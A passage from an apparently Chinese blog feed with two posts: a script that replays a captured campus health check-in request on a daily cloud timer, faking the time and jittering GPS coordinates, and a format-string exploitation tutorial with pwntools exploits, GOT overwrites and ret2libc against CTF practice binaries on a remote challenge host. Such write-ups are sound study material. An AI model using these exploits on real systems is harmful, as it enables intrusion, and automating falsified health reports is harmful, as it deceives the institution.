        <content type="html"><![CDATA[<h1 id="一、-实现原理"><a href="#一、-实现原理" class="headerlink" title="一、 实现原理"></a>一、 实现原理</h1><p>通过定时向健康系统的页面发送一个请求，请求的内容为每次打卡需要的信息。就可实现自动打卡</p><h1 id="二、获取请求的内容"><a href="#二、获取请求的内容" class="headerlink" title="二、获取请求的内容"></a>二、获取请求的内容</h1><p>通过抓包软件抓取，手机上面主要使用的是小黄鸟——HttpCanary 抓取信息，电脑上面主要是通过Fiddler软件。抓取易校园的数据，找到有关<a href="https://h5.xiaofubao.com/marketing/health/getDetail">https://h5.xiaofubao.com/marketing/health/getDetail</a> 链接的请求，然后里面会存在一条关于url文件，url解码即可得到自己发送请求时发送的内容</p><p>可以看到抓取到的信息解码后是（只展示了解码后的一部分）</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220801134534719.png" alt="image-20220801134534719"></p><p>可以发现，传递的内容就是就是你的个人信息。接下来就是将这些内容发送到指定的位置</p><h1 id="三、发送请求"><a href="#三、发送请求" class="headerlink" title="三、发送请求"></a>三、发送请求</h1><p>将请求的内容，发送到健康系统的那个页面</p><h2 id="1-发送方式"><a href="#1-发送方式" class="headerlink" title="1. 发送方式"></a>1. 发送方式</h2><p>发送请求的方式主要的方式是通过python中的一个requests库。</p><p>request库方法介绍</p><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.request()</td><td align="center">构造一个请求，支撑一下各方法的基础方法</td></tr><tr><td align="center">requests.get()</td><td align="center">获取HTML网页的主要方法，对应于HTTP的GET</td></tr><tr><td align="center">requests.head()</td><td align="center">获取HTML网页头信息的方法，对应于HTTP的HEAD</td></tr><tr><td align="center">requests.post()</td><td align="center">向HTML网页提交POST请求的方法，对应于HTTP的POST</td></tr><tr><td align="center">requests.put()</td><td align="center">向HTML网页提交PUT请求的方法，对应于HTTP的PUT</td></tr><tr><td align="center">requests.patch()</td><td align="center">向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td align="center">requests.delete()</td><td align="center">向HTML页面提交删除请求，对应于HTTP的DELETE</td></tr></tbody></table><p>由于在抓取的数据时，发现易校园主要采用的时post的请求方式，所以这里要使用到的是post方法</p><p>requests.put(url, data&#x3D;None, **kwargs)</p><ul><li>url：拟更新页面的url链接</li><li>data：字典、字节序列或文件，Request的内容</li><li>**kwargs：12个控制访问参数</li></ul><p>也就是说通过下面的方式就可以发送请求</p><pre><code class="python">requests.post(url, data= &quot;传递的内容&quot;)</code></pre><h2 id="2-转换格式"><a href="#2-转换格式" class="headerlink" title="2.转换格式"></a>2.转换格式</h2><p>可以看到前面传递内容的data采取的是一个字典的格式，字典就是键值对（一个键对应一个数值），所以需要把上面url内容转换成下面这种格式，才能发送内容</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220116235523762.png"></p><p>转换的话有两种解法：</p><p>（1）自己一个一个的手动修改成字典的形式，这样的话就很费时费力</p><p>（2）写脚本</p><p>这里我采用第二种，脚本不唯一，下面的只是一种思路</p><h3 id="（1）将-amp-转换成回车"><a href="#（1）将-amp-转换成回车" class="headerlink" title="（1）将&amp;转换成回车"></a>（1）将&amp;转换成回车</h3><p>首先查看两者的区别， 字典中没有&amp;， 而且&amp;是作为一组键值对的分界</p><p>利用python中正则表达式的一个方法sub， 来将&amp;替换成回车</p><blockquote><p>正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。</p><p>sub方法：实现正则的替换</p></blockquote><p>函数原型：re.sub(pattern, repl, string, count&#x3D;0, flags&#x3D;0)</p><ul><li>pattern : 正则中的模式字符串。</li><li>repl : 替换的字符串，也可为一个函数。</li><li>string : 要被查找替换的原始字符串。</li><li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li><li>flags : 编译时用的匹配模式，数字形式。</li></ul><p><font color=red>其中前三个为必选参数，后两个为可选参数。</font></p><p>这里利用的方式：</p><pre><code class="python">data_str = re.sub(r&#39;&amp;&#39;, &#39;\n&#39;, info_daka)  # 其中 info_daka 表示的是你url解码以后的内容，data_str表示转换的内容</code></pre><p>将&amp;换成 回车</p><p>目前已经被修改成了：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220116235613591.png"></p><h3 id="（2）转换成多个元组"><a href="#（2）转换成多个元组" class="headerlink" title="（2）转换成多个元组"></a>（2）转换成多个元组</h3><p>利用正则表达式的findall方法将上面的data_str转换成元组（类似于列表，不了解就当作C语言的数组）</p><p>findall方法：</p><blockquote><p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果有多个匹配模式，则返回元组列表，如果没有找到匹配的，则返回空列表。</p><p><strong>注意：</strong> match 和 search 是匹配一次 findall 匹配所有。</p></blockquote><p>语法格式为：</p><pre><code class="python">findall(string[, pos[, endpos]])</code></pre><ul><li><strong>string</strong> : 待匹配的字符串。</li><li><strong>pos</strong> : 可选参数，指定字符串的起始位置，默认为 0。</li><li><strong>endpos</strong> : 可选参数，指定字符串的结束位置，默认为字符串的长度。</li></ul><pre><code class="python">content = re.findall(r&#39;(.*?)=(.*)&#39;, data_str)</code></pre><p>这里重点讲一下<font color=red>‘(.*?)&#x3D;(.*)’</font>的作用， </p><p>首先先看 不加（） 的情况。其中的？表示非贪婪模式，它会自动匹配最少的内容，一般情况默为贪婪模式。匹配更多的情况</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220117012037635.png"></p><p>可以发现它是以回车键为截断的，首先它会将回车键的前部分转换成元组的一个元素，然后将后面的name作为一个元素，放到第二位</p><p>但是加上一个（）以后就发生了变化</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220117012347741.png"></p><p>？就是不贪婪了，前一个括号里不会有等号</p><p>从前往后，找到的第一个等号，就作为划分，后面全部算等号右边的值，包括又出现等号的情况，因为后面是贪婪匹配</p><p><font color=red>这里理解可能还存在问题</font></p><p>那么此时的content里面的内容为：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220116235846679.png"></p><h3 id="（3）最终转换成字典"><a href="#（3）最终转换成字典" class="headerlink" title="（3）最终转换成字典"></a>（3）最终转换成字典</h3><p>最终再通过for循环每一个元组将元素提取出来形成字典，i表示每一个元组，第一个元组：key&#x3D;id，vaule为id的值</p><pre><code class="python">  for i in content:        key = i[0]        value = i[1]        sign_data[key] = value</code></pre><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220117001711505.png"></p><h2 id="3-数据修改"><a href="#3-数据修改" class="headerlink" title="3. 数据修改"></a>3. 数据修改</h2><h3 id="（1）说明"><a href="#（1）说明" class="headerlink" title="（1）说明"></a>（1）说明</h3><p>上面的转换成了字典，但是还有一些内容是实时的需要修改，这里我只修改了其中的两项</p><h3 id="（2）打卡时间的修改"><a href="#（2）打卡时间的修改" class="headerlink" title="（2）打卡时间的修改"></a>（2）打卡时间的修改</h3><p>利用python中的time库的strftime方法实现当前的时间</p><pre><code class="python">datatime = time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;, time.localtime(time.time()))</code></pre><p>然后直接利用update修改字典里面的键对应的值即可</p><pre><code> sign_data.update(&#123;&#39;updateTime&#39;: datatime&#125;)</code></pre><h3 id="（3）经纬度的修改"><a href="#（3）经纬度的修改" class="headerlink" title="（3）经纬度的修改"></a>（3）经纬度的修改</h3><p>这个经纬度其实可改可不改</p><pre><code class="python">num1 = random.randrange(100, 999)num2 = random.randrange(100, 999)addres = re.findall(&#39;(\d&#123;3&#125;\.\d&#123;3&#125;)\d*,(\d&#123;2&#125;\.\d&#123;3&#125;)&#39;, sign_data[&#39;longitudeAndLatitude&#39;])sign_data[&#39;longitudeAndLatitude&#39;]  =  f&#39;&#123;addres[0][0]&#125;&#123;num1&#125;,&#123;addres[0][1]&#125;&#123;num2&#125;&#39;</code></pre><p>前面两行代码表示随机生成随机数</p><p>第三行代码表示减小精度，</p><p>第四行代码表示在最后几位数上随机生成几个数，以此来造成变化</p><h2 id="4-全部代码"><a href="#4-全部代码" class="headerlink" title="4. 全部代码"></a>4. 全部代码</h2><pre><code class="python"># -*- coding:utf-8 -*-import reimport timeimport randomimport requestsdatatime = time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;, time.localtime(time.time()))num1 = random.randrange(100, 999)num2 = random.randrange(100, 999)info_daka = &#39;&#39;def main(*args):    sign_url = &#39;https://h5.xiaofubao.com/marketing/health/doDetail&#39;    data_str = re.sub(r&#39;&amp;&#39;, &#39;\n&#39;, info_daka)    content = re.findall(r&#39;(.*?)=(.*)&#39;, data_str)    sign_data = &#123;&#125;    for i in content:        key = i[0]        value = i[1]        sign_data[key] = value    # print(sign_data)    addres = re.findall(&#39;(\d&#123;3&#125;\.\d&#123;3&#125;)\d*,(\d&#123;2&#125;\.\d&#123;3&#125;)&#39;, sign_data[&#39;longitudeAndLatitude&#39;])    sign_data[        &#39;longitudeAndLatitude&#39;] = f&#39;&#123;addres[0][0]&#125;&#123;num1&#125;,&#123;addres[0][1]&#125;&#123;num2&#125;&#39;    sign_data.update(&#123;&#39;updateTime&#39;: datatime&#125;)    print(sign_data)    res_sign = requests.post(url=sign_url, data=sign_data)    print(res_sign.text)# 云函数入口def main_handler(event, context):    main()if __name__ == &#39;__main__&#39;:    main()</code></pre><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220112180434408.png"></p><h1 id="四、自动化运行脚本"><a href="#四、自动化运行脚本" class="headerlink" title="四、自动化运行脚本"></a>四、自动化运行脚本</h1><p>上面的脚本虽然实现了内容的传递的方式，但是仍然需要运行脚本才能发送请求，如果每次打卡都需要运行脚本的话，那么所做的将毫无意义。采取的方式是，利用腾讯云的云函数，利用里面的定时触发器，每日定时打卡。</p><p>在使用之前，需要在代码中添上两行代码作为云函数的入口</p><pre><code class="python"># 云函数入口def main_handler(event, context):    main()</code></pre><p>接下来就是注册一个腾讯云账号，进入腾讯云函数网址<a href="https://console.cloud.tencent.com/scf/list">https://console.cloud.tencent.com/scf/list</a></p><p>（1）新建函数，选择从头开始，</p><p>（2）在高级配置中修改执行超过时间</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220117002904550.png"></p><p>（3）在触发配置中选择自定义创建，具体要实现的情况自己选择，也可以直接确定</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220117003015028.png"></p><p>（4）在函数管理中，将前面的代码写进去，然后再测试，部署即可</p>]]></content>
      
      
      <categories>
          
          <category> 工具箱 </category>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞学习</title>
      <link href="/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="一、格式化字符串的基本原理"><a href="#一、格式化字符串的基本原理" class="headerlink" title="一、格式化字符串的基本原理"></a>一、格式化字符串的基本原理</h1><h2 id="1、了解printf函数族"><a href="#1、了解printf函数族" class="headerlink" title="1、了解printf函数族"></a>1、了解printf函数族</h2><p>格式化字符串漏洞主要是printf函数家族的问题。像printf、fprintf、sprintf、snprintf等格式化字符串函数课接受变数量的参数，并且将第一个参数作为格式化字符串</p><p>像下面的printf函数一样：前面的第一个参数表示的是格式化字符串，当中的符号说明与后面的参数一一对应。第一个参数中的格式化字符串的数量决定了后面参数的数量</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430215411006.png" alt="image-20220430215411006"></p><p>常见的符号i说明：</p><p>（1）%d：以十进制形式输出带符号整数</p><p>（2） %s：不是打印栈中的内容，而是通过栈中地址寻址。 把存储单元内的数据转换成ASCII字符格式输出，直到遇到字符””\0”才会停止</p><p>（3）%p：将所指向的内容当成是指针来输出，不是输出它的地址，实际上与输出十六进制格式差不多</p><p>它打印出来的是这个栈地址所指向的内容：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101408921.png" alt="image-20220430101408921"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101529916.png" alt="image-20220430101529916"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430101458769.png" alt="image-20220430101458769"></p><h2 id="2、printf的输出原理"><a href="#2、printf的输出原理" class="headerlink" title="2、printf的输出原理"></a>2、printf的输出原理</h2><p>（1）其中，它的第一个是格式化字符串，然后接下来的就是它的后门几个参数，格式化字符串位于esp处</p><pre><code class="c">#include &lt;stdio.h&gt;int main()&#123;    char str[] = &quot;Hello&quot;;    int x = 32;    char s[] = &quot;pwnpwnpwn&quot;;    printf(&quot;%s %d %s %c&quot;, str, x, s, &#39;\n&#39;);    return 0;&#125;</code></pre><p>（2）printf的读取方式：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153742463.png" alt="image-20220430153742463"></p><p>（3）它会按照参数的顺序以此读取内容，但是此时如果我修改掉它的第一个参数的内容为第三个参数的数值，那么此时它的输出就会发生变化</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153850406.png" alt="image-20220430153850406"></p><p>（4）此时它的输出就为：pwnpwnpwn 32 pwnpwnpwn</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430153944418.png" alt="image-20220430153944418"></p><p>结论：</p><p>① 如果我们能够控制格式化字符串的内容，我们就能得到栈上所有内容的值</p><p>② 再通过%s能够任意地址读取了</p><h2 id="3、printf的漏洞利用点"><a href="#3、printf的漏洞利用点" class="headerlink" title="3、printf的漏洞利用点"></a>3、printf的漏洞利用点</h2><p>（1）我们都知道printf格式化字符串的里的个数和参数的个数都是相同的。 正常使用printf函数：</p><pre><code class="c">char str[100];scnaf(&quot;%s&quot;, &amp;str);printf(&quot;%s&quot;, str);</code></pre><p>（2）但是有时候为了简写，它会省略格式化字符串</p><pre><code class="c">char str[100];scnaf(&quot;%s&quot;, &amp;str);printf(str);</code></pre><p>（4）如果我们str输入的内容是：格式化字符串的形式，它就会把这些内容当作是格式化字符串，然后一次输出格式化字符串后面的每一个参数</p><p>然而，有时候为了省事会写成</p><pre><code class="c">char str[100];scanf(&quot;%s&quot;, &amp;str);printf(str);</code></pre><p>（5）这种情况正常情况下是没有什么问题，但是我如果添加上格式化字符串以后</p><blockquote><p>aaaa-%p-%p-%p-%p-%p-%p-%p-%p</p></blockquote><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430104238788.png" alt="image-20220430104238788"></p><p>（6）而printf输出的都是栈上的所有内容，也就是说这样就可以通过格式化字符串泄露任意地址，其中较为常见的就是泄露cananry的地址，只要知道canary地址相对于esp的地址，就可以通过%k$p的相对地址来泄露canary的数值</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430104303662.png" alt="image-20220430104303662"></p><h2 id="4、-的使用"><a href="#4、-的使用" class="headerlink" title="4、$的使用"></a>4、$的使用</h2><p>（4）%K$d：将更改参数对应顺序，与格式化字符串后的第K个参数进行对应</p><p>比如下面的printf，他的第一个参数是</p><pre><code class="c">#include &lt;stdio.h&gt;int main()&#123;    int a = 4, b = 6, c = 2;    printf(&quot;%3$d + %1$d = %2$d\n&quot;,a, b, c);    return 0;&#125;</code></pre><p>正常情况下根据参数的位置输出的是4 + 6 &#x3D; 2，但是在%d加上指定的参数的位置以后就可以获取到相应的内容</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430102055996.png" alt="image-20220430102055996"></p><p>%k在任何的格式化情况下都可以使用：</p><h1 id="二、格式化字符串漏洞——任意读"><a href="#二、格式化字符串漏洞——任意读" class="headerlink" title="二、格式化字符串漏洞——任意读"></a>二、格式化字符串漏洞——任意读</h1><h2 id="1、泄露canary"><a href="#1、泄露canary" class="headerlink" title="1、泄露canary"></a>1、泄露canary</h2><p>其实前面讲解的很清楚了，gdb动态调试能知道canary的位置相对于esp的起始位置，然后利用%K$p 将canary打印出来即可。解题步骤</p><p>（1） 获取到canary的地址，可以发现canary距离esp的位置为15，所以利用 %15$p 就可以获取到canary的值</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430183334854.png" alt="image-20220430183334854"></p><p><img src="/img/image-20220430183527080.png" alt="image-20220430183527080"></p><p>（2）此时需要编写脚本来实现接收到数据</p><pre><code class="python">r.sendline(&#39;%15$p&#39;)canary = int(r.recv(10), 16)print(&#39;canary ==&gt;&#39; + hex(canary))print type(canary)</code></pre><p>canary共有十位，所以需要接收十位。由于接收到的数据类型为str类型，而p32打包的时候需要用到的是整型。所以需要用 int函数将字符转换成整型，后门的16表示转换的进制数，默认十进制</p><p>（3） 溢出时将canary的值重新填写回去，溢出覆盖返回地址即可</p><pre><code class="python">payload = &#39;a&#39; * 32 + p32(canary) + &#39;a&#39;*12 + p32(0x080484df)</code></pre><h2 id="2、泄露pie基地址"><a href="#2、泄露pie基地址" class="headerlink" title="2、泄露pie基地址"></a>2、泄露pie基地址</h2><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211730385.png" alt="image-20220430211730385"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211756994.png" alt="image-20220430211756994"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211920243.png" alt="image-20220430211920243"></p><h1 id="三、格式化字符串漏洞——任意写"><a href="#三、格式化字符串漏洞——任意写" class="headerlink" title="三、格式化字符串漏洞——任意写"></a>三、格式化字符串漏洞——任意写</h1><h2 id="1、绕过判断，修改某个数值"><a href="#1、绕过判断，修改某个数值" class="headerlink" title="1、绕过判断，修改某个数值"></a>1、绕过判断，修改某个数值</h2><p>%n：把前面已经打印的长度写入某个内存地址，写入的是四个字节</p><p>%hn：写入的是两个字节</p><p>%hhn：写入的是一个字节</p><p>如：</p><blockquote><p>利用 %hhn把值0x6a686664 写道0x8045566地址里面</p></blockquote><p>0x64 写进 0x8045566</p><p>0x66 写进 0x8045567</p><p>0x68 写进 0x8045568</p><p>0x6a 写进 0x8045569</p><p>p32(0x8045566) + p32(0x8045567) + p32(0x8045568) + p32(0x8045569) + ‘%84c%offset$hnn’ + ‘%84c%offset+1$hnn’ + ‘%2c%offset$hnn’  +  ‘%2c%offset+2$hnn’   +  ‘%2c% offset+3+2$hnn’</p><p>如果是逆序的化就需要溢出，取低字节</p><p>（4） %n：将%n之前打印出来的字符个数，赋值给一个变量</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212240038.png" alt="image-20220430212240038"></p><p>很典型的格式化字符串漏洞的任意写题目，只要让pwnme &#x3D;&#x3D; 8就能getshell。</p><p>首先测量格式化输入的地址距离esp的距离：为10</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212852204.png" alt="image-20220430212852204"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212730081.png" alt="image-20220430212730081"></p><p>接下来就是修改pwnme地址处的值了，先</p><pre><code># payload = fmtstr_payload(10, &#123;0x0804A068: 8&#125;)payload = p32(0x0804A068) + &#39;%4c%10$n&#39;</code></pre><h2 id="2、任意写神器——fmtstr-payload"><a href="#2、任意写神器——fmtstr-payload" class="headerlink" title="2、任意写神器——fmtstr_payload"></a>2、任意写神器——fmtstr_payload</h2><p>fmtstr_payload是pwntools里面的一个工具</p><pre><code class="python">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)# 第一个参数表示格式化字符串的偏移# 第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system地址，就写成&#123;printf: system&#125;# 第三个参数表示已经输出的字符个数，这里没有为，采用默认0# 第四个参数表示写入方式，是按照字节(byte)、双字节(short)、还是四字节(int)。他对应着hhn、hn、n。默认为hhn#fmtstr_payload函数返回的就是payload一般做题主要就是前面的两个参数，基本格式为：fmtstr_payload(offset, &#123;address:vaule1&#125;) ==&gt; payload = fmtstr_payload(10, &#123;atoi_addr: system_addr&#125;)</code></pre><p>所以直接利用fmtstr_payload函数修改任意地址的值为任意值即可getshell</p><p>如果整个程序都没有开启relor保护的化，可以直接下面存在的一个函数的got表指向system函数的地址，使其执行该函数时会自动执行system函数的地址</p><pre><code class="python">payload = fmtstr_payload(10, &#123;e.got[&quot;puts&quot;]: 0x080486E8&#125;)</code></pre><h1 id="四、格式化字符串漏洞——无限循环"><a href="#四、格式化字符串漏洞——无限循环" class="headerlink" title="四、格式化字符串漏洞——无限循环"></a>四、格式化字符串漏洞——无限循环</h1><p>待补充</p><h1 id="五、常见格式化字符串漏洞题目"><a href="#五、常见格式化字符串漏洞题目" class="headerlink" title="五、常见格式化字符串漏洞题目"></a>五、常见格式化字符串漏洞题目</h1><h2 id="1、第五空间2019-决赛-PWN5"><a href="#1、第五空间2019-决赛-PWN5" class="headerlink" title="1、第五空间2019_决赛_PWN5"></a>1、第五空间2019_决赛_PWN5</h2><p>利用格式化字符串漏洞的任意写功能，将随机数的值修改成一个固定的值</p><p>（1）程序分析：32为程序，开启了Canary和NX保护</p><p><img src="/img/image-20220322215436958-16593323952891.png"></p><p>（2）打开IDA查看一下源代码</p><p>存在一个格式化字符串漏洞，存在一个判断，当输入的一个数与一个随机数相等时获取flag</p><p><img src="/img/image-20220322215947385-16593323952893.png" alt="image-20220322215947385"></p><p>（3）整体分析</p><ul><li>time 与 srand函数设置一个随机数，这里没什么用</li><li>打开一个文件然后从里面读取4个字节大小的内容，没有这个文件，读取的数是随机的</li><li>然后输入你的姓名，不存在溢出情况，但是有一个格式化字符串漏洞</li><li>然后再输入你的密码，这个密码值会与之前在文件里面的数值进行比较，如果相同就获取flag</li></ul><p>（4）漏洞分析</p><ul><li>存在格式化字符串漏洞，利用它任意写的特点。第一次输入这个随机数改成一个常数，第二次输入这个常数就能判断成功获得flag了。</li><li>由于这个程序没有开启RELRO保护，可以修改plt表和got表。可以利用格式化字符串的任意写功能，第一次输入时将atoi函数的got表修改成system函数，第二次输入时将nptr处写出 “&#x2F;bin&#x2F;sh”，因此当你接下来要执行atoi函数时就会执行system函数，就可以获取flag</li></ul><p>（5）解题过程</p><ul><li>确定格式化字符串的位置， 可以发现格式化字符串在第十个</li></ul><pre><code class="bash">muggle@muggle-virtual-machine:~/CTF-Pwn/BUUCTF/[第五空间2019 决赛]PWN5$ ./pwnyour name:aaaa -%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%pHello,aaaa -0xff947738-0x63-(nil)-0xf7f0da9c-0x3-0xf7ee0410-0x1-(nil)-0x1-0x61616161-0x70252d20-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70</code></pre><ul><li>然后将随机数修改为4</li></ul><p>exp1 ：</p><pre><code class="python">from pwn import *local = 1e = ELF(&quot;./pwn&quot;)if local == 1:    r = process(&quot;./pwn&quot;)    #libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)else :    r = reomte(&quot;&quot;)    libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)def gdb_attach():    gdb.attach(r)    pause()addr = 0x0804C044payload = p32(addr) + &quot;%10$n&quot;r.recvuntil(&quot;your name:&quot;)r.sendline(payload)# gdb_attach()r.recvuntil(&quot;your passwd:&quot;)r.sendline(str(4))r.interactive()</code></pre><p>分析：</p><blockquote><p> addr表示的地址是随机数（dword_804C044）的地址，然后由于格式化字符串在第十个就%10$n，而且32位程序前面有四个字节，故将这个地址的值改为了一个固定的值4，所以再输入4就可以获得flag</p></blockquote><p>exp2：</p><pre><code class="python">from pwn import *local = 1e = ELF(&quot;./pwn&quot;)if local == 1:    r = process(&quot;./pwn&quot;)    #libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)else :    r = reomte(&quot;&quot;)    libc = ELF(&quot;&quot;)    # context(log_level = &#39;debug&#39;)def gdb_attach():    gdb.attach(r)    pause()atoi_got_addr = e.got[&quot;atoi&quot;]system_addr = e.symbols[&quot;system&quot;]payload = fmtstr_payload(10, &#123;atoi_addr: system_addr&#125;)r.recvuntil(&quot;your name:&quot;)r.sendline(payload)r.sendline(&quot;/bin/sh&quot;)r.interactive()</code></pre><p>分析：</p><blockquote><p>利用fmstr_payload这个工具，直接将atoi的got表的地址改成了system函数地址，然后再输入参数就可以在执行atoi时执行system函数地址。</p></blockquote><h2 id="2、jarvisoj-fm"><a href="#2、jarvisoj-fm" class="headerlink" title="2、jarvisoj_fm"></a>2、jarvisoj_fm</h2><p>任意写</p><p>（1）程序分析：32位程序，开启了NX保护，打开 IDA， 查看一下源代码</p><p><img src="/img/image-20220720165419041-16593323952895.png" alt="image-20220720165419041"></p><p>可以明显的看到格式化字符串漏洞，并且当x等于4时就可以获得权限。所以这道题的思路就是利用格式化字符串漏洞的任意写功能修改x的值为4。</p><p>exp：</p><pre><code class="python">from pwn import *r = remote(&quot;node4.buuoj.cn&quot;,25852)#r = process(&quot;./pwn&quot;)addr = 0x0804A02Cpayload1 = fmtstr_payload(11,&#123;addr:0x4&#125;#payload1 = p32(addr) + &#39;%11$hhn&#39;r.sendline(payload1)r.sendline(&quot;cat ./flag&quot;)r.interactive()</code></pre><h2 id="3、HarekazeCTF-2019"><a href="#3、HarekazeCTF-2019" class="headerlink" title="3、HarekazeCTF_2019"></a>3、HarekazeCTF_2019</h2><p>ret2libc（printf泄露）</p><p>程序分析：**<font color=red >64位程序，开启了NX保护</font>**，打开 IDA， 查看一下源代码<br><img src="/./img/image-20220720165444148.png" alt="image-20220720165444148"><br>存在read函数溢出，再查看是否存在后门地址。没有发现system函数，利用libc泄露system函数了</p><p>注意：</p><p>（1）这里是用printf来打印泄露read函数的真正地址，这里泄露printf函数是不行的。printf泄露的话要注意第一个是格式化字符串，所以你首先须要在ida里面找到一个带有%s格式化字符串的地址。<br>（2）找某个文件名的方法</p><blockquote><p>find -name “flag”</p></blockquote><p>exp：</p><pre><code class="python">from pwn import *#r = process(&quot;./pwn&quot;)r = remote(&quot;node4.buuoj.cn&quot;,25038)e = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)context(log_level = &#39;debug&#39;)printf_plt_addr = e.plt[&quot;printf&quot;]read_got_addr = e.got[&quot;read&quot;]main_addr = e.symbols[&quot;main&quot;]format_addr = 0x0000000000400770rdi_ret_addr = 0x0000000000400733rsi_r15_ret_addr = 0x0000000000400731offset = 0x20 + 8payload1 = offset*&#39;a&#39; + p64(rdi_ret_addr) + p64(format_addr) + p64(rsi_r15_ret_addr) + p64(read_got_addr) + p64(1) + p64(printf_plt_addr) + p64(main_addr)r.recvuntil(&quot;What&#39;s your name? &quot;)r.sendline(payload1)read_addr = u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))print(hex(read_addr))#pause()base_addr = read_addr - libc.symbols[&quot;read&quot;]system_addr = base_addr + libc.symbols[&quot;system&quot;]binsh_addr = base_addr + libc.search(&quot;/bin/sh&quot;).next()payload2 = offset*&#39;a&#39; + p64(rdi_ret_addr) + p64(binsh_addr) + p64(system_addr) + p64(1)r.recvuntil(&quot;What&#39;s your name? &quot;)r.sendline(payload2)#r.sendline(&quot;cat flag&quot;)r.interactive()</code></pre><h1 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h1><p>（1）<a href="https://blog.csdn.net/qq_39268483/article/details/92399248">https://blog.csdn.net/qq_39268483/article/details/92399248</a></p><p>（2）<a href="https://www.kanxue.com/book-57-857.htm">https://www.kanxue.com/book-57-857.htm</a></p><p>（3）<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/</a></p><p>（4）<a href="https://baijiahao.baidu.com/s?id=1669093381463931480&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1669093381463931480&amp;wfr=spider&amp;for=pc</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 格式化字符串漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>花式栈溢出--栈迁移</title>
      <link href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
